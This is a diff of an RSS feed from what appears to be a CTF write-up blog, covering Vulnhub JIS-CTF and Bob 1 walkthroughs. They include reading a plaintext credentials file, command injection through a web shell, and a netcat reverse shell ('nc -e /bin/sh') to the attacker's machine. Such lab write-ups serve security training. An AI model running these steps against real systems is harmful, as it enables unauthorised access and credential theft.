+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 12
+drwxr-xr-x  3 root     root     4096 Apr 11  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 23 root     root     4096 Jun 27 10:46 ..
+drwxr-xr-x  3 technawi technawi 4096 Apr 21  2017 technawi
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;technawi
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 48
+drwxr-xr-x 3 technawi technawi 4096 Apr 21  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 3 root     root     4096 Apr 11  2017 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 technawi technawi 4321 Apr 21  2017 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 technawi technawi  220 Apr 11  2017 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 technawi technawi 3771 Apr 11  2017 .bashrc
+drwx------ 2 technawi technawi 4096 Apr 11  2017 .cache
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 technawi technawi  655 Apr 11  2017 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 technawi technawi    0 Apr 11  2017 .sudo_as_admin_successful
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root     root     6666 Apr 21  2017 .viminfo
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root     root     7141 Apr 18  2017 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But as nothing was there I decided to look at content of &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 12
+drwxr-xr-x  3 www-data www-data 4096 Apr 18  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 14 root     root     4096 Apr 18  2017 ..
+drwxr-xr-x  8 www-data www-data 4096 Apr 21  2017 html
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;html
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 60
+drwxr-xr-x 8 www-data www-data 4096 Apr 21  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 3 www-data www-data 4096 Apr 18  2017 ..
+drwxrwxr-x 2 www-data www-data 4096 Apr 21  2017 admin_area
+drwx------ 5 www-data www-data 4096 Apr 19  2017 assets
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  306 Apr 19  2017 check_login.php
+drwx------ 2 www-data www-data 4096 Apr 19  2017 css
+drwxr-xr-x 2 www-data www-data 4096 Apr 21  2017 flag
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 technawi technawi  132 Apr 21  2017 flag.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  145 Apr 21  2017 hint.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 www-data www-data 1966 Apr 19  2017 index.php
+drwx------ 2 www-data www-data 4096 Apr 19  2017 js
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 www-data www-data 1485 Apr 19  2017 login.php
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  128 Apr 19  2017 logout.php
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 www-data www-data  160 Apr 19  2017 robots.txt
+drwxrwxr-x 2 www-data www-data 4096 Jun 27 11:38 uploaded_files
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;hint.txt	
+try to find user technawi password to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;the flag.txt file, you can find it &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a hidden file &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+The 3rd flag is : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;7645110034526579012345670&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Two more flags to go! As stated in the hint, we can’t access the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: flag.txt: Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After a trial and error marathon, I’ve found the hidden file with this simple &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; command listing all files owned by &lt;code class=&quot;highlighter-rouge&quot;&gt;technawi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; technawi 2&amp;gt;/dev/null
+/etc/mysql/conf.d/credentials.txt
+/var/www/html/flag.txt
+/home/technawi
+/home/technawi/.cache
+/home/technawi/.bash_history
+/home/technawi/.sudo_as_admin_successful
+/home/technawi/.profile
+/home/technawi/.bashrc
+/home/technawi/.bash_logout&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can take a look at the credentials.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/mysql/conf.d/credentials.txt
+The 4th flag is : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;7845658974123568974185412&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+username : technawi
+password : 3vilH@ksor&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let’s login with &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into that account and retrieve the final flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/vulnhub/jis-ctf# ssh technawi@10.0.0.5
+technawi@10.0.0.5&lt;span class=&quot;s1&quot;&gt;'s password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+114 packages can be updated.
+1 update is a security update.
+
+
+Last login: Fri Apr 21 17:22:16 2017
+technawi@Jordaninfosec-CTF01:~$ cd /var/www/html
+technawi@Jordaninfosec-CTF01:/var/www/html$ ls -la
+total 60
+drwxr-xr-x 8 www-data www-data 4096 Apr 21  2017 .
+drwxr-xr-x 3 www-data www-data 4096 Apr 18  2017 ..
+drwxrwxr-x 2 www-data www-data 4096 Apr 21  2017 admin_area
+drwx------ 5 www-data www-data 4096 Apr 19  2017 assets
+-rw-r--r-- 1 www-data www-data  306 Apr 19  2017 check_login.php
+drwx------ 2 www-data www-data 4096 Apr 19  2017 css
+drwxr-xr-x 2 www-data www-data 4096 Apr 21  2017 flag
+-rw-r----- 1 technawi technawi  132 Apr 21  2017 flag.txt
+-rw-r--r-- 1 www-data www-data  145 Apr 21  2017 hint.txt
+-rw-rw-r-- 1 www-data www-data 1966 Apr 19  2017 index.php
+drwx------ 2 www-data www-data 4096 Apr 19  2017 js
+-rw-rw-r-- 1 www-data www-data 1485 Apr 19  2017 login.php
+-rw-r--r-- 1 www-data www-data  128 Apr 19  2017 logout.php
+-rw-rw-r-- 1 www-data www-data  160 Apr 19  2017 robots.txt
+drwxrwxr-x 2 www-data www-data 4096 Jun 27 11:38 uploaded_files
+technawi@Jordaninfosec-CTF01:/var/www/html$ cat flag.txt
+The 5th flag is : {5473215946785213456975249}
+
+Good job :)
+
+You find 5 flags and got their points and finish the first scenario....&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Wed, 27 Jun 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-jis-ctf/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-jis-ctf/</guid>
+      </item>
+    
+      <item>
         <title>Blockchain challenge</title>
         <description>&lt;p&gt;I got this challenge from my friend &lt;strong&gt;Yodak&lt;/strong&gt;, with simple instruction - become a millionaire. At first we are presented with a webpage containing 2 forms - register and login.&lt;/p&gt;
 
@@ -1209,856 +1580,6 @@ MadLib generated using program found &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&
         <pubDate>Fri, 23 Mar 2018 03:00:00 +0100</pubDate>
         <link>http://localhost:4000/angstromctf-madlibs/</link>
         <guid isPermaLink="true">http://localhost:4000/angstromctf-madlibs/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnhub.com - Bob 1</title>
-        <description>&lt;p&gt;Welcome back to another machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Bob 1&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Bob is my first CTF VM that I have ever made so be easy on me if it's not perfect.
-The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debain. Could there a few weak points in the new unfinished server?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: &lt;a href=&quot;http://c0rruptedb1t.ddns.net/&quot;&gt;c0rruptedb1t&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Download: &lt;a href=&quot;http://c0rruptedb1t.ddns.net/vms/bob.html&quot;&gt;http://c0rruptedb1t.ddns.net/vms/bob.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;As always we have to get the IP address of the vulnerable machine. Here we can see that it’s sitting on &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.2.4&lt;/code&gt; address, with 2 open ports - &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00030s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 998 closed ports
-PORT   STATE SERVICE
-21/tcp open  ftp
-80/tcp open  http
-MAC Address: 08:00:27:C0:CC:74 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;So we can just go straight to the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service, but in the same time, I decided to run more complex &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan that will cover all ports.&lt;/p&gt;
-
-&lt;p&gt;But to the website.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/bob/web.png&quot; alt=&quot;Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After viewing some of the sub pages, I’ve noticed a comment in the source code.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- If you are the new IT staff I have sent a letter to you about a web shell you can use
--Bob
---&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In order to enumerate as much as possible, I decided to also note down content from the &lt;code class=&quot;highlighter-rouge&quot;&gt;contact&lt;/code&gt; page.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;IT Dept
-Bob J
-
-Phone: +61-021-743-4215
-Email: admin@milburghigh.com
-Sebastian W
-
-Phone: +61-029-124-6842
-Email: seb.w@milburghigh.com
-Elliot A
-
-Phone:
-Email: elliot.a@protonmail.com
-Jospeh C
-
-Phone: +61-029-124-7842
-Email: jc@milburghigh.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;login&lt;/code&gt; page.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Complete IT School System Rework
-
-Last week we had a hacker breach our school network and comprise our servers, we are unsure if they stole or leaked anything important, however, we have taken steps to prevent this happening again. We have hired new IT staff to help secure the network and the main school server is only accessible internally. For that reason we have disabled logging in externally until further notice.
-
--Dean MacDuffy (principle)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;While looking at some of these notes, the previously started &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan has just ended. Let’s take a look at the results.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#  nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.4
-
-Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-03-18 12:20 EDT
-NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.00s elapsed
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.00s elapsed
-Initiating ARP Ping Scan at 12:20
-Scanning 10.0.2.4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
-Completed ARP Ping Scan at 12:20, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Parallel DNS resolution of 1 host. at 12:20
-Completed Parallel DNS resolution of 1 host. at 12:20, 0.00s elapsed
-Initiating SYN Stealth Scan at 12:20
-Scanning 10.0.2.4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 80/tcp on 10.0.2.4
-Discovered open port 21/tcp on 10.0.2.4
-Discovered open port 25468/tcp on 10.0.2.4
-Completed SYN Stealth Scan at 12:20, 6.38s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Service scan at 12:20
-Scanning 3 services on 10.0.2.4
-Completed Service scan at 12:20, 6.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.4&lt;/span&gt;
-NSE: Script scanning 10.0.2.4.
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.29s elapsed
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.01s elapsed
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00055s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65532 closed ports
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     ProFTPD 1.3.5b
-80/tcp    open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 4 disallowed entries
-| /login.php /dev_shell.php /lat_memo.html
-|_/passwords.html
-|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
-25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
-| ssh-hostkey:
-|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
-|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
-|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (EdDSA)
-MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.8
-Uptime guess: 198.048 days (since Fri Sep  1 11:11:48 2017)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=260 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.55 ms 10.0.2.4
-
-NSE: Script Post-scanning.
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.00s elapsed
-Initiating NSE at 12:20
-Completed NSE at 12:20, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
-           Raw packets sent: 65570 (2.886MB) | Rcvd: 65588 (2.788MB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As you can see, it discovered quite a few things in the webpage, together with a new open port - 25468 running &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service. Let’s note that down and move forward.&lt;/p&gt;
-
-&lt;p&gt;As the scan showed us that there is &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file, we can take a look at it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;User-agent: *
-Disallow: /login.php
-Disallow: /dev_shell.php
-Disallow: /lat_memo.html
-Disallow: /passwords.html&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can look at each of these pages. Firstly - passwords.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Really who made this file at least get a hash of your password to display, hackers can't do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &amp;gt;:(
--Bob&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Memo web page.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Memo sent at GMT+10:00 2:37:42 by User: Bob
-Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.
-
--Bob&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And finally a dev shell page, containing another comment.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- WIP, don't forget to report any bugs we don't want another breach guys
--Bob --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I quickly noticed that there was no possibility to run any commands. But after a few moments there it was, a possibility to run  &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;echo &quot;test&quot;
-test&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After that I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt; command and to my amusement, it works!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;eval ls -la
-
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h5&amp;gt;&lt;/span&gt;Output:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h5&amp;gt;&lt;/span&gt;
-total 1572
-drwxr-xr-x 2 root root    4096 Mar  5 04:53 .
-drwxr-xr-x 3 root root    4096 Feb 28 19:03 ..
--rw-r--r-- 1 root root      84 Mar  5 04:53 .hint
--rw-r--r-- 1 root root  340400 Mar  4 14:09 WIP.jpg
--rw-r--r-- 1 root root    2588 Mar  4 14:09 about.html
--rw-r--r-- 1 root root    3145 Mar  4 14:09 contact.html
--rw-r--r-- 1 root root    1396 Mar  4 14:09 dev_shell.php
--rw-r--r-- 1 root root    1361 Mar  4 14:09 dev_shell.php.bak
--rw-r--r-- 1 root root 1177950 Mar  4 14:09 dev_shell_back.png
--rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html
--rw-r--r-- 1 root root    1425 Mar  4 14:09 index.html.bak
--rw-r--r-- 1 root root    1925 Mar  4 14:09 lat_memo.html
--rw-r--r-- 1 root root    1560 Mar  4 14:09 login.html
--rw-r--r-- 1 root root    4086 Mar  4 14:09 news.html
--rw-r--r-- 1 root root     687 Mar  5 04:37 passwords.html
--rw-r--r-- 1 root root     111 Mar  4 14:09 robots.txt
--rw-r--r-- 1 root root   26357 Mar  4 14:09 school_badge.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Do you see &lt;code class=&quot;highlighter-rouge&quot;&gt;.hint&lt;/code&gt; file? Let’s view it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Have you tried spawning a tty shell? Also don't forget to check for hidden files ;)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we’re certain that the best option would be to create a reverse shell using &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;eval nc -e /bin/sh 10.0.2.15 1234&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
-10.0.2.4: inverse host lookup failed: Unknown host
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.2.15] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.2.4] 48628
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 1572
-drwxr-xr-x 2 root root    4096 Mar  5 04:53 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 3 root root    4096 Feb 28 19:03 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root      84 Mar  5 04:53 .hint
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  340400 Mar  4 14:09 WIP.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    2588 Mar  4 14:09 about.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    3145 Mar  4 14:09 contact.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1396 Mar  4 14:09 dev_shell.php
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1361 Mar  4 14:09 dev_shell.php.bak
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 1177950 Mar  4 14:09 dev_shell_back.png
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1425 Mar  4 14:09 index.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1425 Mar  4 14:09 index.html.bak
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1925 Mar  4 14:09 lat_memo.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    1560 Mar  4 14:09 login.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root    4086 Mar  4 14:09 news.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root     687 Mar  5 04:37 passwords.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root     111 Mar  4 14:09 robots.txt
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root   26357 Mar  4 14:09 school_badge.png
-python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we have it! Let’s play around and see what files we can find interesting. Firstly, I decide to take a look at the source code of the shell.&lt;/p&gt;
-
